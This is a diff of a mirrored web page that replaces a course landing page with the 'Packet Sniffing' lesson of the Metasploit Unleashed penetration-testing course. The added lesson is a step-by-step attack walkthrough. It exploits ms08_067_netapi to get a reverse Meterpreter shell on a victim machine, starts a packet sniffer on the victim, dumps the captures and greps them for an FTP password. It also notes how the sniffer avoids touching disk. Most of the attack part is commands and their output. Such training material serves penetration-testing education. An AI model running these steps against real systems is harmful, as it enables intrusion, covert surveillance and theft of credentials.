@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Packet Sniffing - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Packet_Sniffing" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Packet_Sniffing&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Packet_Sniffing&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Packet_Sniffing&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,269 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Packet Sniffing</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Packet_Sniffing#column-one">navigation</a>, <a href="Packet_Sniffing#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>Meterpreter has the capability of packet sniffing the remote host without ever touching the hard disk. This is especially useful if we want to monitor what type of information is being sent, and even better, this is probably the start of multiple auxiliary modules that will ultimately look for sensitive data within the capture files. The sniffer module can store up to 200,000 packets in a ring buffer and exports them in standard PCAP format so you can process them using psnuffle, dsniff, wireshark, etc.
+<br />
+<br />
+We first fire off our remote exploit toward the victim and gain our standard reverse Meterpreter console.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use exploit/windows/smb/ms08_067_netapi</span>
+msf exploit(<span style='color:#ff0000;'>ms08_067_netapi</span>) > <span style='color:#13C16A;'>set PAYLOAD windows/meterpeter/reverse_tcp</span>
+msf exploit(<span style='color:#ff0000;'>ms08_067_netapi</span>) > <span style='color:#13C16A;'>set LHOST 10.211.55.126</span>
+msf exploit(<span style='color:#ff0000;'>ms08_067_netapi</span>) > <span style='color:#13C16A;'>set RHOST 10.10.1.119</span>
+msf exploit(<span style='color:#ff0000;'>ms08_067_netapi</span>) > <span style='color:#13C16A;'>exploit</span>
+
+<span style='color:#0000FF;'>[*]</span> Handler binding to LHOST 0.0.0.0
+<span style='color:#0000FF;'>[*]</span> Started reverse handler
+<span style='color:#0000FF;'>[*]</span> Triggering the vulnerability...
+<span style='color:#0000FF;'>[*]</span> Transmitting intermediate stager for over-sized stage...(216 bytes)
+<span style='color:#0000FF;'>[*]</span> Sending stage (205824 bytes)
+<span style='color:#0000FF;'>[*]</span> Meterpreter session 1 opened (10.10.1.4:4444 -> 10.10.1.119:1921)</pre>
+<br />
+From here we initiate the sniffer on interface 1 and start collecting packets. We then dump the sniffer output to /tmp/all.cap.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>use sniffer</span>
+Loading extension sniffer...success.
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>help</span>
+
+Sniffer Commands
+================
+
+     Command             Description
+     -------             -----------
+     sniffer_dump        Retrieve captured packet data
+     sniffer_interfaces  List all remote sniffable interfaces
+     sniffer_start       Capture packets on a previously opened interface
+     sniffer_stats       View statistics of an active capture
+     sniffer_stop        Stop packet captures on the specified interface
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>sniffer_interfaces</span>
+
+1 - 'VMware Accelerated AMD PCNet Adapter' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>sniffer_start 1</span>
+<span style='color:#0000FF;'>[*]</span> Capture started on interface 1 (200000 packet buffer)
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>sniffer_dump 1 /tmp/all.cap</span>
+<span style='color:#0000FF;'>[*]</span> Dumping packets from interface 1...
+<span style='color:#0000FF;'>[*]</span> Wrote 19 packets to PCAP file /tmp/all.cap
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>sniffer_dump 1 /tmp/all.cap</span>
+<span style='color:#0000FF;'>[*]</span> Dumping packets from interface 1...
+<span style='color:#0000FF;'>[*]</span> Wrote 199 packets to PCAP file /tmp/all.cap</pre>
+<br />
+We can now use our favorite parser or packet analysis tool to review the information intercepted.
+<br />
+<br />
+The Meterpreter packet sniffer uses the MicroOLAP Packet Sniffer SDK and can sniff the packets from the victim machine without ever having to install any drivers or write to the file system. The module is smart enough to realize its own traffic as well and will automatically remove any traffic from the Meterpreter interaction. In addition, Meterpreter pipes all information through an SSL/TLS tunnel and is fully encrypted. 
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<h2> <span class="mw-headline" id="packetrecorder">packetrecorder</span></h2>
+<p>As an alternative to using the sniffer extension, Carlos Perez wrote the packetrecorder Meterpreter script that allows for some more granularity when capturing packets. To see what options are available, we issue the <b>"run packetrecorder"</b> comamnd without any arguments.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run packetrecorder</span> 
+Meterpreter Script for capturing packets in to a PCAP file
+on a target host given a interface ID.
+
+OPTIONS:
+
+    -h        Help menu.
+    -i <opt>  Interface ID number where all packet capture will be done.
+    -l <opt>  Specify and alternate folder to save PCAP file.
+    -li        List interfaces that can be used for capture.
+    -t <opt>  Time interval in seconds between recollection of packet, default 30 seconds.</pre>
+<br />
+Before we start sniffing traffic, we first need to determine which interfaces are available to us.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run packetrecorder -li</span>
+
+1 - 'Realtek RTL8139 Family PCI Fast Ethernet NIC' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )
+2 - 'Citrix XenServer PV Ethernet Adapter' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
+3 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )</pre>
+<br />
+We will begin sniffing traffic on the second interface, saving the logs to the desktop of our BackTrack system and let the sniffer run for awhile.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run packetrecorder -i 2 -l /root/</span>
+<span style='color:#0000FF;'>[*]</span> Starting Packet capture on interface 2
+<span style='color:#00ff00;'>[+]</span> Packet capture started
+<span style='color:#0000FF;'>[*]</span> Packets being saved in to /root/logs/packetrecorder/XEN-XP-SP2-BARE_20101119.5105/XEN-XP-SP2-BARE_20101119.5105.cap
+<span style='color:#0000FF;'>[*]</span> Packet capture interval is 30 Seconds
+<span style='color:#13C16A;'>^C</span>
+<span style='color:#0000FF;'>[*]</span> Interrupt 
+<span style='color:#00ff00;'>[+]</span> Stopping Packet sniffer...
+<u>meterpreter</u> ></pre>
+<br />
+There is now a capture file waiting for us that can be analyzed in a tool such as Wireshark or tshark. We will take a quick look to see if we captured anything interesting.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~/logs/packetrecorder/XEN-XP-SP2-BARE_20101119.5105# <span style='color:#13C16A;'>tshark -r XEN-XP-SP2-BARE_20101119.5105.cap |grep PASS</span>
+Running as user "root" and group "root". This could be dangerous.
+2489  82.000000 192.168.1.201 -> 209.132.183.61 FTP Request: PASS s3cr3t
+2685  96.000000 192.168.1.201 -> 209.132.183.61 FTP Request: PASS s3cr3t</pre>
+<br />
+</p>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="MSF_Post_Exploitation" title="MSF Post Exploitation">MSF Post Exploitation</a> &gt; Packet Sniffing</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="Privilege_Escalation" title="Privilege Escalation">Privilege Escalation</a> &#124; <a href="PSExec_Pass_The_Hash" title="PSExec Pass The Hash">PSExec Pass The Hash</a> &#124; <a href="Event_Log_Management" title="Event Log Management">Event Log Management</a> &#124; <a href="Fun_With_Incognito" title="Fun With Incognito">Fun With Incognito</a> &#124; <a href="Interacting_With_The_Registry" title="Interacting With The Registry">Interacting With The Registry</a> &#124; <a href="Enabling_Remote_Desktop" title="Enabling Remote Desktop">Enabling Remote Desktop</a> &#124; <strong class="selflink">Packet Sniffing</strong> &#124; <a href="Pivoting" title="Pivoting">Pivoting</a> &#124; <a href="TimeStomp" title="TimeStomp">TimeStomp</a> &#124; <a href="Screen_Capture" title="Screen Capture">Screen Capture</a> &#124; <a href="Searching_For_Content" title="Searching For Content">Searching For Content</a> &#124; <a href="John_The_Ripper" title="John The Ripper">John The Ripper</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 541/1000000
+Preprocessor generated node count: 2737/1000000
+Post‐expand include size: 4158/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:64-0!*!0!*!*!*!* and timestamp 20131124025420 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Packet_Sniffing&amp;oldid=1530">http://www.offensive-security.com/w/index.php?title=Packet_Sniffing&amp;oldid=1530</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:MSF_Post_Exploitation&amp;action=edit&amp;redlink=1" class="new" title="Category:MSF Post Exploitation (page does not exist)">MSF Post Exploitation</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +754,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.126 secs. --></body></html>
